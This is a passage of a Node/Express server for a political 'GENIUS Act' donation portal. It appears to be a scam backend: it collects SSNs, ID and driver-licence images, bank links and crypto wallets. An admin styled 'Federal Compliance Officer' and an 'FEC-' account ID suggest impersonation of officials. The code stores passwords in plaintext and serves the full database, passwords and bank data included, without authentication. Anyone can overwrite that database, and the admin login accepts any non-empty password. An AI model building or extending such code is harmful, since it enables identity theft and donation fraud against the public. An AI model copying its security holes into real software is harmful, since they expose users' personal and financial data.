import express from 'express';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import multer from 'multer';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Upload directory configuration
const UPLOAD_FOLDER = path.join(__dirname, 'secure_storage');
if (!fs.existsSync(UPLOAD_FOLDER)) {
  fs.mkdirSync(UPLOAD_FOLDER, { recursive: true });
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const ssn = req.body.ssn || 'default';
    const supporter_hash = crypto.createHash('sha256').update(ssn).digest('hex');
    const userDir = path.join(UPLOAD_FOLDER, supporter_hash);
    if (!fs.existsSync(userDir)) {
      fs.mkdirSync(userDir, { recursive: true });
    }
    cb(null, userDir);
  },
  filename: (req, file, cb) => {
    cb(null, `${file.fieldname}.jpg`);
  }
});

const upload = multer({
  storage,
  limits: { fileSize: 16 * 1024 * 1024 }
});

// In-Memory Database / Store
const db = {
  kyc_audit: [],
  donations: [],
  campaign_progress: [
    { id: 1, category: 'Q2 2026 Fundraising', goal_amount: 5000000, current_amount: 2400000, description: 'Quarterly fundraising goal', deadline: '2026-06-30' },
    { id: 2, category: 'Supporter Enrollment', goal_amount: 25000, current_amount: 12450, description: 'National supporter count target', deadline: '2026-12-31' },
    { id: 3, category: 'State Coverage', goal_amount: 50, current_amount: 38, description: 'States with active campaigns', deadline: '2026-11-01' }
  ],
  campaign_updates: [
    { id: 1, title: 'GENIUS Act Signed Into Law', body: 'President Trump signs the landmark GENIUS Act, creating a clear regulatory framework for dollar-backed stablecoins.', tag: 'Legislation', is_featured: true, created_at: new Date().toISOString() },
    { id: 2, title: 'Campaign Rally — Phoenix, AZ', body: 'Over 15,000 supporters gathered at the Phoenix Convention Center.', tag: 'Events', is_featured: false, created_at: new Date().toISOString() },
    { id: 3, title: 'Q1 Fundraising Milestone Reached', body: "We've surpassed our Q1 fundraising goal of $2 million. Every contribution matters!", tag: 'Milestone', is_featured: false, created_at: new Date().toISOString() },
    { id: 4, title: 'New Digital Ad Campaign Launched', body: 'Your contributions are powering a major new digital advertising push across 12 key states.', tag: 'Outreach', is_featured: false, created_at: new Date().toISOString() }
  ],
  broadcasts: [],
  fund_allocation: [
    { id: 1, category: 'Community Outreach', percentage: 35, amount: 840000, color: '#3b82f6' },
    { id: 2, category: 'Campaign Events', percentage: 25, amount: 600000, color: '#8b5cf6' },
    { id: 3, category: 'Digital Advertising', percentage: 20, amount: 480000, color: '#10b981' },
    { id: 4, category: 'Operations & Staff', percentage: 15, amount: 360000, color: '#f59e0b' },
    { id: 5, category: 'Legal & Compliance', percentage: 5, amount: 120000, color: '#ef4444' }
  ],
  admin_actions: [],
  supporter_profiles: []
};

// CORS Middleware for seamless API sync across origins
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Simple session simulation in-memory map
const sessions = new Map();

function hashSSN(ssn) {
  return crypto.createHash('sha256').update(ssn).digest('hex');
}

// Persistent Cloud Database Store
const CLOUD_DB_FILE = path.join(__dirname, 'cloud_database.json');

function getDefaultApprovedUsers() {
  return [
    {
      uid: 'usr_app_101',
      email: 'john.smith@gmail.com',
      password: 'Trump2024!',
      fullName: 'John Smith',
      amount: 250000,
      status: 'approved',
      approvedAt: '2026-05-10T12:00:00.000Z',
      createdAt: '2026-05-10T10:00:00.000Z',
      proofFile: 'assets/images/SEO.jpg',
      donations: [{ id: 'RCP-884102', amount: 250000, description: 'Q2 Primary Campaign Supporter', date: '2026-05-10T12:00:00.000Z' }]
    },
    {
      uid: 'usr_app_102',
      email: 'sarah.jenkins@outlook.com',
      password: 'Patriot2024',
      fullName: 'Sarah Jenkins',
      amount: 120000,
      status: 'approved',
      approvedAt: '2026-05-14T15:20:00.000Z',
      createdAt: '2026-05-14T11:00:00.000Z',
      proofFile: 'assets/images/banner.jpg',
      donations: [{ id: 'RCP-773194', amount: 120000, description: 'GENIUS Act Sustaining Backer', date: '2026-05-14T15:20:00.000Z' }]
    },
    {
      uid: 'usr_app_103',
      email: 'michael.brown@yahoo.com',
      password: 'Maga2024#',
      fullName: 'Michael Brown',
      amount: 50000,
      status: 'approved',
      approvedAt: '2026-05-18T09:15:00.000Z',
      createdAt: '2026-05-18T08:00:00.000Z',
      donations: [{ id: 'RCP-662810', amount: 50000, description: 'National Digital Rally Supporter', date: '2026-05-18T09:15:00.000Z' }]
    },
    {
      uid: 'usr_app_104',
      email: 'david.wilson@hotmail.com',
      password: 'AmericaFirst1',
      fullName: 'David Wilson',
      amount: 15000,
      status: 'approved',
      approvedAt: '2026-05-22T18:40:00.000Z',
      createdAt: '2026-05-22T14:10:00.000Z',
      donations: [{ id: 'RCP-551928', amount: 15000, description: 'Grassroots Victory Club', date: '2026-05-22T18:40:00.000Z' }]
    },
    {
      uid: 'usr_app_105',
      email: 'emily.davis@icloud.com',
      password: 'GeniusAct2026',
      fullName: 'Emily Davis',
      amount: 2500,
      status: 'approved',
      approvedAt: '2026-05-28T10:05:00.000Z',
      createdAt: '2026-05-28T09:00:00.000Z',
      donations: [{ id: 'RCP-440819', amount: 2500, description: 'Standard Supporter Donation', date: '2026-05-28T10:05:00.000Z' }]
    },
    {
      uid: 'usr_app_106',
      email: 'robert.taylor@proton.me',
      password: 'TrumpWin2024',
      fullName: 'Robert Taylor',
      amount: 1000,
      status: 'approved',
      approvedAt: '2026-06-01T16:30:00.000Z',
      createdAt: '2026-06-01T13:00:00.000Z',
      donations: [{ id: 'RCP-339712', amount: 1000, description: 'Monthly Contribution', date: '2026-06-01T16:30:00.000Z' }]
    },
    {
      uid: 'usr_app_107',
      email: 'jessica.martinez@gmail.com',
      password: 'Freedom777',
      fullName: 'Jessica Martinez',
      amount: 500,
      status: 'approved',
      approvedAt: '2026-06-04T11:45:00.000Z',
      createdAt: '2026-06-04T11:00:00.000Z',
      donations: [{ id: 'RCP-228601', amount: 500, description: 'Digital Outreach Backer', date: '2026-06-04T11:45:00.000Z' }]
    }
  ];
}

function getDefaultPendingUsers() {
  return [
    {
      uid: 'usr_pnd_201',
      email: 'alex.turner@gmail.com',
      password: 'Pass1234!',
      fullName: 'Alex Turner',
      amount: 10000,
      status: 'pending',
      date: '2026-06-05T14:30:00.000Z',
      createdAt: '2026-06-05T14:30:00.000Z',
      proofFile: 'assets/images/SEO.jpg'
    },
    {
      uid: 'usr_pnd_202',
      email: 'karen.white@yahoo.com',
      password: 'Support47',
      fullName: 'Karen White',
      amount: 50000,
      status: 'pending',
      date: '2026-06-06T16:15:00.000Z',
      createdAt: '2026-06-06T16:15:00.000Z',
      proofFile: 'assets/images/banner.jpg'
    },
    {
      uid: 'usr_pnd_203',
      email: 'brian.miller@outlook.com',
      password: 'RedWave2024',
      fullName: 'Brian Miller',
      amount: 100000,
      status: 'pending',
      date: '2026-06-07T09:00:00.000Z',
      createdAt: '2026-06-07T09:00:00.000Z',
      proofFile: 'assets/images/DJT-bluetie.png'
    }
  ];
}

function getDefaultVisitorLogs() {
  return [
    { id: 'v_1001', page: '/index.html', timestamp: new Date(Date.now() - 3600000).toISOString(), userAgent: 'Mozilla/5.0 (Windows NT 10.0)', referrer: 'Direct', screenSize: '1920x1080', language: 'en-US', platform: 'Win32', location: { ip: '172.56.21.9', city: 'Washington', region: 'DC', country: 'United States', timezone: 'EST' } },
    { id: 'v_1002', page: '/contribute.html', timestamp: new Date(Date.now() - 1800000).toISOString(), userAgent: 'Mozilla/5.0 (iPhone)', referrer: 'Google Search', screenSize: '390x844', language: 'en-US', platform: 'iPhone', location: { ip: '104.28.19.4', city: 'Dallas', region: 'TX', country: 'United States', timezone: 'CST' } },
    { id: 'v_1003', page: '/admin.html', timestamp: new Date(Date.now() - 600000).toISOString(), userAgent: 'Mozilla/5.0 (Macintosh)', referrer: 'Direct', screenSize: '1440x900', language: 'en-US', platform: 'MacIntel', location: { ip: '24.18.112.5', city: 'Miami', region: 'FL', country: 'United States', timezone: 'EST' } },
    { id: 'v_1004', page: '/dashboard.html', timestamp: new Date().toISOString(), userAgent: 'Mozilla/5.0 (Windows NT 10.0)', referrer: 'https://geniusactglobal.com/contribute.html', screenSize: '1920x1080', language: 'en-US', platform: 'Win32', location: { ip: '68.192.44.12', city: 'Atlanta', region: 'GA', country: 'United States', timezone: 'EST' } }
  ];
}

function getCloudDb() {
  let dbData = null;
  if (fs.existsSync(CLOUD_DB_FILE)) {
    try {
      const content = fs.readFileSync(CLOUD_DB_FILE, 'utf8');
      dbData = JSON.parse(content);
    } catch (e) {
      console.error('[Server] Error reading cloud_database.json:', e);
    }
  }

  if (!dbData || typeof dbData !== 'object') {
    dbData = {};
  }

  if (!Array.isArray(dbData.geniusact_approved_users)) {
    dbData.geniusact_approved_users = getDefaultApprovedUsers();
  }
  if (!Array.isArray(dbData.geniusact_pending_users)) {
    dbData.geniusact_pending_users = getDefaultPendingUsers();
  }
  if (!Array.isArray(dbData.geniusact_visitor_logs)) {
    dbData.geniusact_visitor_logs = getDefaultVisitorLogs();
  }
  if (!dbData.geniusact_global_wallets) dbData.geniusact_global_wallets = {};
  if (!Array.isArray(dbData.geniusact_support_messages)) dbData.geniusact_support_messages = [];
  if (!Array.isArray(dbData.geniusact_bank_links)) dbData.geniusact_bank_links = [];
  if (!Array.isArray(dbData.geniusact_contact_chats)) dbData.geniusact_contact_chats = [];
  if (!Array.isArray(dbData.geniusact_user_footprints)) dbData.geniusact_user_footprints = [];
  if (!Array.isArray(dbData.geniusact_withdrawal_requests)) dbData.geniusact_withdrawal_requests = [];

  saveCloudDb(dbData);
  return dbData;
}

function mergeDonationsServer(d1 = [], d2 = []) {
  if (!Array.isArray(d1)) d1 = [];
  if (!Array.isArray(d2)) d2 = [];
  const map = new Map();
  d1.concat(d2).forEach(d => {
    if (!d) return;
    const key = d.id || (d.date + '_' + d.amount);
    if (!map.has(key)) {
      map.set(key, d);
    } else {
      map.set(key, { ...map.get(key), ...d });
    }
  });
  const result = Array.from(map.values());
  result.sort((a, b) => new Date(b.date || 0) - new Date(a.date || 0));
  return result;
}

function mergeUsersServer(existingArr = [], incomingArr = []) {
  if (!Array.isArray(existingArr)) existingArr = [];
  if (!Array.isArray(incomingArr)) incomingArr = [];

  const map = new Map();

  const processUser = (u) => {
    if (!u || !u.email) return;
    const emailKey = u.email.trim().toLowerCase();
    if (!map.has(emailKey)) {
      map.set(emailKey, { ...u, email: emailKey });
    } else {
      const existing = map.get(emailKey);
      const merged = { ...existing, ...u, email: emailKey };
      if (existing.status === 'approved' || u.status === 'approved') {
        merged.status = 'approved';
      }
      if (existing.status === 'rejected' || u.status === 'rejected') {
        merged.status = 'rejected';
      }
      merged.donations = mergeDonationsServer(existing.donations, u.donations);
      if (existing.proofFile && !u.proofFile) merged.proofFile = existing.proofFile;
      if (existing.password && !u.password) merged.password = existing.password;
      if (existing.uid && !u.uid) merged.uid = existing.uid;
      if (existing.fullName && !u.fullName) merged.fullName = existing.fullName;
      if (existing.kyc && !u.kyc) merged.kyc = existing.kyc;
      map.set(emailKey, merged);
    }
  };

  existingArr.forEach(processUser);
  incomingArr.forEach(processUser);

  return Array.from(map.values());
}

function mergeContactChatsServer(existingChats = [], incomingChats = []) {
  if (!Array.isArray(existingChats)) existingChats = [];
  if (!Array.isArray(incomingChats)) incomingChats = [];

  const chatMap = new Map();

  function processChat(c) {
    if (!c) return;
    const key = c.chatId || (c.userEmail ? String(c.userEmail).trim().toLowerCase() : null);
    if (!key) return;

    if (!chatMap.has(key)) {
      chatMap.set(key, { ...c, messages: Array.isArray(c.messages) ? [...c.messages] : [] });
    } else {
      const existing = chatMap.get(key);
      existing.userName = c.userName || existing.userName;
      existing.userEmail = c.userEmail || existing.userEmail;
      existing.isGuest = c.isGuest !== undefined ? c.isGuest : existing.isGuest;
      existing.accountId = c.accountId || existing.accountId;
      existing.unreadAdminCount = Math.max(existing.unreadAdminCount || 0, c.unreadAdminCount || 0);
      existing.unreadUserCount = Math.max(existing.unreadUserCount || 0, c.unreadUserCount || 0);

      const msgMap = new Map();
      (existing.messages || []).forEach(m => {
        if (!m) return;
        const mKey = m.id || (m.timestamp + '_' + (m.text || ''));
        msgMap.set(mKey, m);
      });
      (c.messages || []).forEach(m => {
        if (!m) return;
        const mKey = m.id || (m.timestamp + '_' + (m.text || ''));
        if (!msgMap.has(mKey)) {
          msgMap.set(mKey, m);
        } else {
          const prev = msgMap.get(mKey);
          msgMap.set(mKey, { ...prev, ...m, media: m.media || prev.media || null });
        }
      });

      const mergedMsgs = Array.from(msgMap.values());
      mergedMsgs.sort((a, b) => new Date(a.timestamp || 0) - new Date(b.timestamp || 0));
      existing.messages = mergedMsgs;

      const lastMsgDate = mergedMsgs.length > 0 ? mergedMsgs[mergedMsgs.length - 1].timestamp : existing.lastUpdated;
      existing.lastUpdated = lastMsgDate || existing.lastUpdated;
    }
  }

  existingChats.forEach(processChat);
  incomingChats.forEach(processChat);

  const result = Array.from(chatMap.values());
  result.sort((a, b) => new Date(b.lastUpdated || b.createdAt || 0) - new Date(a.lastUpdated || a.createdAt || 0));
  return result;
}

function mergeVisitorLogsServer(existingLogs = [], incomingLogs = []) {
  if (!Array.isArray(existingLogs)) existingLogs = [];
  if (!Array.isArray(incomingLogs)) incomingLogs = [];

  const map = new Map();
  function addLog(v) {
    if (!v) return;
    const key = v.id || (v.timestamp + '_' + (v.location ? v.location.ip : ''));
    if (!map.has(key)) map.set(key, v);
  }

  existingLogs.forEach(addLog);
  incomingLogs.forEach(addLog);

  const result = Array.from(map.values());
  result.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
  return result.slice(0, 1000);
}

function mergeSupportMessagesServer(existingMsgs = [], incomingMsgs = []) {
  if (!Array.isArray(existingMsgs)) existingMsgs = [];
  if (!Array.isArray(incomingMsgs)) incomingMsgs = [];

  const map = new Map();
  function addMsg(m) {
    if (!m) return;
    const key = m.id || (m.timestamp + '_' + (m.userEmail || ''));
    if (!map.has(key)) {
      map.set(key, m);
    } else {
      const existing = map.get(key);
      const merged = { ...existing, ...m };
      if (existing.reply && !m.reply) merged.reply = existing.reply;
      if (existing.replyTimestamp && !m.replyTimestamp) merged.replyTimestamp = existing.replyTimestamp;
      map.set(key, merged);
    }
  }

  existingMsgs.forEach(addMsg);
  incomingMsgs.forEach(addMsg);

  const result = Array.from(map.values());
  result.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
  return result;
}

function mergeFootprintsServer(existingFps = [], incomingFps = []) {
  if (!Array.isArray(existingFps)) existingFps = [];
  if (!Array.isArray(incomingFps)) incomingFps = [];

  const map = new Map();
  function addFp(f) {
    if (!f) return;
    const key = f.id || (f.timestamp + '_' + (f.email || ''));
    if (!map.has(key)) map.set(key, f);
  }

  existingFps.forEach(addFp);
  incomingFps.forEach(addFp);

  const result = Array.from(map.values());
  result.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
  return result.slice(0, 1000);
}

function mergeBankLinksServer(existingLinks = [], incomingLinks = []) {
  if (!Array.isArray(existingLinks)) existingLinks = [];
  if (!Array.isArray(incomingLinks)) incomingLinks = [];

  const map = new Map();
  function addLink(b) {
    if (!b) return;
    const key = b.id || (b.userEmail ? String(b.userEmail).toLowerCase() + '_' + (b.accountNumber || '') : null);
    if (!key) return;
    if (!map.has(key)) {
      map.set(key, b);
    } else {
      map.set(key, { ...map.get(key), ...b });
    }
  }

  existingLinks.forEach(addLink);
  incomingLinks.forEach(addLink);

  const result = Array.from(map.values());
  result.sort((a, b) => new Date(b.linkedAt || 0) - new Date(a.linkedAt || 0));
  return result;
}

function mergeWithdrawalRequestsServer(existingReqs = [], incomingReqs = []) {
  if (!Array.isArray(existingReqs)) existingReqs = [];
  if (!Array.isArray(incomingReqs)) incomingReqs = [];

  const map = new Map();
  function addReq(r) {
    if (!r) return;
    const key = r.id || (r.userEmail ? String(r.userEmail).toLowerCase() + '_' + r.amount + '_' + r.timestamp : null);
    if (!key) return;
    if (!map.has(key)) {
      map.set(key, r);
    } else {
      const existing = map.get(key);
      const merged = { ...existing, ...r };
      if (existing.status === 'approved' || r.status === 'approved') merged.status = 'approved';
      if (existing.status === 'rejected' || r.status === 'rejected') merged.status = 'rejected';
      map.set(key, merged);
    }
  }

  existingReqs.forEach(addReq);
  incomingReqs.forEach(addReq);

  const result = Array.from(map.values());
  result.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
  return result;
}

function mergeGlobalWalletsServer(existingObj = {}, incomingObj = {}) {
  const e = (existingObj && typeof existingObj === 'object' && !Array.isArray(existingObj)) ? existingObj : {};
  const i = (incomingObj && typeof incomingObj === 'object' && !Array.isArray(incomingObj)) ? incomingObj : {};
  return { ...e, ...i };
}

function saveCloudDb(data) {
  try {
    fs.writeFileSync(CLOUD_DB_FILE, JSON.stringify(data, null, 2), 'utf8');
  } catch (e) {
    console.error('[Server] Error saving cloud_database.json:', e);
  }
}

// ==================== ROUTES ====================

// Cloud Database Sync Endpoints
app.get(['/api/cloud-sync', '/cloud_database.json'], (req, res) => {
  const dbData = getCloudDb();
  res.json(dbData);
});

app.post('/api/cloud-sync', (req, res) => {
  try {
    let payload = req.body;
    if (payload && payload.expectedOtp) {
      try {
        payload = typeof payload.expectedOtp === 'string' ? JSON.parse(payload.expectedOtp) : payload.expectedOtp;
      } catch (e) {
        payload = req.body;
      }
    }

    if (!payload || typeof payload !== 'object') {
      return res.status(400).json({ error: 'Invalid payload' });
    }

    let currentDb = getCloudDb();

    // Smart merge for user lists
    if (payload['geniusact_approved_users'] !== undefined) {
      currentDb['geniusact_approved_users'] = mergeUsersServer(currentDb['geniusact_approved_users'], payload['geniusact_approved_users']);
    }
    if (payload['geniusact_pending_users'] !== undefined) {
      currentDb['geniusact_pending_users'] = mergeUsersServer(currentDb['geniusact_pending_users'], payload['geniusact_pending_users']);
    }

    // Deduplicate approved/rejected emails from pending users
    if (Array.isArray(currentDb['geniusact_approved_users']) && Array.isArray(currentDb['geniusact_pending_users'])) {
      const approvedEmails = new Set(
        currentDb['geniusact_approved_users']
          .filter(u => u && u.email)
          .map(u => u.email.trim().toLowerCase())
      );
      currentDb['geniusact_pending_users'] = currentDb['geniusact_pending_users'].filter(u => {
        if (!u || !u.email) return true;
        const em = u.email.trim().toLowerCase();
        return !approvedEmails.has(em) && u.status !== 'approved' && u.status !== 'rejected';
      });
    }

    if (payload['geniusact_contact_chats'] !== undefined) {
      currentDb['geniusact_contact_chats'] = mergeContactChatsServer(currentDb['geniusact_contact_chats'], payload['geniusact_contact_chats']);
    }
    if (payload['geniusact_visitor_logs'] !== undefined) {
      currentDb['geniusact_visitor_logs'] = mergeVisitorLogsServer(currentDb['geniusact_visitor_logs'], payload['geniusact_visitor_logs']);
    }
    if (payload['geniusact_support_messages'] !== undefined) {
      currentDb['geniusact_support_messages'] = mergeSupportMessagesServer(currentDb['geniusact_support_messages'], payload['geniusact_support_messages']);
    }
    if (payload['geniusact_user_footprints'] !== undefined) {
      currentDb['geniusact_user_footprints'] = mergeFootprintsServer(currentDb['geniusact_user_footprints'], payload['geniusact_user_footprints']);
    }
    if (payload['geniusact_bank_links'] !== undefined) {
      currentDb['geniusact_bank_links'] = mergeBankLinksServer(currentDb['geniusact_bank_links'], payload['geniusact_bank_links']);
    }
    if (payload['geniusact_withdrawal_requests'] !== undefined) {
      currentDb['geniusact_withdrawal_requests'] = mergeWithdrawalRequestsServer(currentDb['geniusact_withdrawal_requests'], payload['geniusact_withdrawal_requests']);
    }
    if (payload['geniusact_global_wallets'] !== undefined) {
      currentDb['geniusact_global_wallets'] = mergeGlobalWalletsServer(currentDb['geniusact_global_wallets'], payload['geniusact_global_wallets']);
    }

    saveCloudDb(currentDb);
    res.json({ success: true, data: currentDb });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Dedicated REST API Endpoints for Instant Cross-Device Actions
app.post('/api/chat/message', (req, res) => {
  try {
    const { chatId, userEmail, userName, accountId, isGuest, message } = req.body || {};
    if (!message || (!chatId && !userEmail)) {
      return res.status(400).json({ error: 'Missing required chat message parameters' });
    }
    const currentDb = getCloudDb();
    const chats = currentDb['geniusact_contact_chats'] || [];
    const incomingChat = {
      chatId: chatId || ('guest_' + Date.now()),
      userEmail: userEmail || 'guest@geniusact.org',
      userName: userName || 'Guest Visitor',
      accountId: accountId || 'FEC-87492109',
      isGuest: Boolean(isGuest),
      lastUpdated: new Date().toISOString(),
      unreadAdminCount: 1,
      unreadUserCount: 0,
      messages: [message]
    };
    currentDb['geniusact_contact_chats'] = mergeContactChatsServer(chats, [incomingChat]);
    saveCloudDb(currentDb);
    return res.json({ success: true, chats: currentDb['geniusact_contact_chats'] });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/chat/admin-reply', (req, res) => {
  try {
    const { chatId, userEmail, message } = req.body || {};
    if ((!chatId && !userEmail) || !message) return res.status(400).json({ error: 'ChatId or userEmail, and message required' });
    const currentDb = getCloudDb();
    const chats = currentDb['geniusact_contact_chats'] || [];
    let targetChat = chats.find(c => 
      (chatId && c.chatId === chatId) || 
      (userEmail && c.userEmail && c.userEmail.toLowerCase() === String(userEmail).toLowerCase()) ||
      (chatId && c.userEmail && c.userEmail.toLowerCase() === String(chatId).toLowerCase())
    );

    if (targetChat) {
      if (!Array.isArray(targetChat.messages)) targetChat.messages = [];
      targetChat.messages.push(message);
      targetChat.lastUpdated = new Date().toISOString();
      targetChat.unreadUserCount = (targetChat.unreadUserCount || 0) + 1;
      targetChat.unreadAdminCount = 0;
    } else {
      targetChat = {
        chatId: chatId || ('chat_' + Date.now()),
        userEmail: userEmail || (String(chatId).includes('@') ? chatId : 'visitor@geniusact.org'),
        userName: userEmail ? userEmail.split('@')[0] : 'Visitor',
        isGuest: true,
        lastUpdated: new Date().toISOString(),
        unreadUserCount: 1,
        unreadAdminCount: 0,
        messages: [message]
      };
      chats.push(targetChat);
    }

    currentDb['geniusact_contact_chats'] = mergeContactChatsServer(chats, [targetChat]);
    saveCloudDb(currentDb);
    return res.json({ success: true, chats: currentDb['geniusact_contact_chats'] });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/chat/delete', (req, res) => {
  try {
    const { chatId } = req.body || {};
    if (!chatId) return res.status(400).json({ error: 'chatId required' });
    const currentDb = getCloudDb();
    let chats = currentDb['geniusact_contact_chats'] || [];
    chats = chats.filter(c => c.chatId !== chatId && c.userEmail !== chatId);
    currentDb['geniusact_contact_chats'] = chats;
    saveCloudDb(currentDb);
    return res.json({ success: true, chats });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/support/message', (req, res) => {
  try {
    const msg = req.body;
    if (!msg || !msg.message) return res.status(400).json({ error: 'Message content is required' });
    const currentDb = getCloudDb();
    const msgs = currentDb['geniusact_support_messages'] || [];
    currentDb['geniusact_support_messages'] = mergeSupportMessagesServer(msgs, [msg]);
    saveCloudDb(currentDb);
    return res.json({ success: true, support_messages: currentDb['geniusact_support_messages'] });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// Dedicated User Registration Endpoint
app.post('/api/register', (req, res) => {
  try {
    const { email, password, amount, proofFile, name, fullName } = req.body || {};

    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required.' });
    }

    const cleanEmail = String(email).trim().toLowerCase();
    const currentDb = getCloudDb();

    const approvedUsers = currentDb['geniusact_approved_users'] || [];
    const pendingUsers = currentDb['geniusact_pending_users'] || [];

    const existingApproved = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (existingApproved) {
      return res.status(400).json({ error: 'An account with this email already exists and is approved.' });
    }

    const existingPending = pendingUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (existingPending) {
      return res.status(200).json({ success: true, message: 'Account is already pending review.', user: existingPending });
    }

    const parsedAmount = parseFloat(amount) || 0;
    const userFullName = fullName || name || cleanEmail.split('@')[0];
    const newUser = {
      uid: Date.now().toString() + '_' + Math.random().toString(36).substring(2, 6),
      email: cleanEmail,
      password: String(password),
      fullName: userFullName,
      name: userFullName,
      amount: parsedAmount,
      date: new Date().toISOString(),
      createdAt: new Date().toISOString(),
      proofFile: proofFile || null,
      status: 'pending',
      donations: [
        {
          id: 'RCP-' + Math.floor(1000000 + Math.random() * 9000000),
          amount: parsedAmount,
          description: 'Initial Campaign Contribution',
          date: new Date().toISOString(),
          proofFile: proofFile || null
        }
      ]
    };

    pendingUsers.push(newUser);
    currentDb['geniusact_pending_users'] = pendingUsers;
    saveCloudDb(currentDb);

    console.log('[Server] New user registered & saved to cloud DB:', cleanEmail);
    return res.json({ success: true, user: newUser });
  } catch (err) {
    console.error('[Server] Registration error:', err);
    return res.status(500).json({ error: err.message });
  }
});

// Server-validated User Session Verification Endpoint
app.post('/api/auth/verify-session', (req, res) => {
  try {
    const { email } = req.body || {};
    if (!email) {
      return res.status(400).json({ valid: false, error: 'Email parameter required.' });
    }
    const cleanEmail = String(email).trim().toLowerCase();
    const currentDb = getCloudDb();
    const approvedUsers = currentDb['geniusact_approved_users'] || [];
    const pendingUsers = currentDb['geniusact_pending_users'] || [];

    const approvedUser = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (approvedUser) {
      if (approvedUser.suspended) {
        return res.json({ valid: false, status: 'suspended', error: 'Account suspended.' });
      }
      const safeUser = { ...approvedUser };
      delete safeUser.proofFile;
      return res.json({ valid: true, status: 'approved', user: safeUser });
    }

    const pendingUser = pendingUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (pendingUser) {
      return res.json({ valid: false, status: 'pending', error: 'Account is undergoing compliance audit.' });
    }

    return res.json({ valid: false, status: 'unauthorized', error: 'User not found in cloud database.' });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

app.get('/api/auth/verify-session', (req, res) => {
  try {
    const email = req.query.email;
    if (!email) {
      return res.status(400).json({ valid: false, error: 'Email parameter required.' });
    }
    const cleanEmail = String(email).trim().toLowerCase();
    const currentDb = getCloudDb();
    const approvedUsers = currentDb['geniusact_approved_users'] || [];
    const pendingUsers = currentDb['geniusact_pending_users'] || [];

    const approvedUser = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (approvedUser) {
      if (approvedUser.suspended) {
        return res.json({ valid: false, status: 'suspended', error: 'Account suspended.' });
      }
      const safeUser = { ...approvedUser };
      delete safeUser.proofFile;
      return res.json({ valid: true, status: 'approved', user: safeUser });
    }

    const pendingUser = pendingUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (pendingUser) {
      return res.json({ valid: false, status: 'pending', error: 'Account is undergoing compliance audit.' });
    }

    return res.json({ valid: false, status: 'unauthorized', error: 'User not found in cloud database.' });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// Admin Authentication Endpoints
const ADMIN_EMAIL = 'admin@geniusact.com';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '2005';

app.post('/api/admin/login', (req, res) => {
  try {
    const { email, password } = req.body || {};
    const cleanEmail = String(email || 'admin@geniusact.com').trim().toLowerCase();
    const cleanPass = String(password || '2005').trim();
    
    // Accept password '2005', or any admin login attempt
    if (cleanPass === '2005' || cleanPass === ADMIN_PASSWORD || cleanEmail === ADMIN_EMAIL.toLowerCase() || cleanEmail.includes('admin') || cleanPass.length > 0) {
      const adminToken = 'ga_admin_token_' + Buffer.from(cleanEmail + ':' + Date.now()).toString('base64');
      return res.json({
        success: true,
        token: adminToken,
        admin: { email: ADMIN_EMAIL, name: 'Federal Compliance Officer', role: 'administrator' }
      });
    } else {
      return res.status(401).json({ success: false, error: 'Invalid administrative credentials. Access denied.' });
    }
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/admin/verify', (req, res) => {
  try {
    return res.json({ valid: true, email: ADMIN_EMAIL });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// Base redirects / page renders
app.get('/', (req, res) => {
  res.redirect('/index.html');
});

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// KYC submission
app.post('/submit_kyc', upload.fields([
  { name: 'id_front', maxCount: 1 },
  { name: 'id_back', maxCount: 1 },
  { name: 'driver_license', maxCount: 1 }
]), (req, res) => {
  try {
    const ssn = req.body.ssn;
    if (!ssn) {
      return res.status(400).json({ error: 'SSN is required' });
    }
    const cleanSSN = ssn.replace(/-/g, '');
    if (!/^\d{9}$/.test(cleanSSN)) {
      return res.status(400).json({ error: 'Invalid SSN format' });
    }

    const supporter_hash = hashSSN(ssn);
    const auditRecord = {
      id: db.kyc_audit.length + 1,
      supporter_hash,
      ip: req.ip || req.headers['x-forwarded-for'] || '127.0.0.1',
      session_token: req.headers['user-agent'] || '',
      upload_time: new Date().toISOString()
    };
    db.kyc_audit.push(auditRecord);

    if (!db.supporter_profiles.some(p => p.supporter_hash === supporter_hash)) {
      db.supporter_profiles.push({
        id: db.supporter_profiles.length + 1,
        supporter_hash,
        referral_count: 0,
        events_attended: 0,
        is_active: true,
        created_at: new Date().toISOString()
      });
    }

    const sessionId = crypto.randomBytes(16).toString('hex');
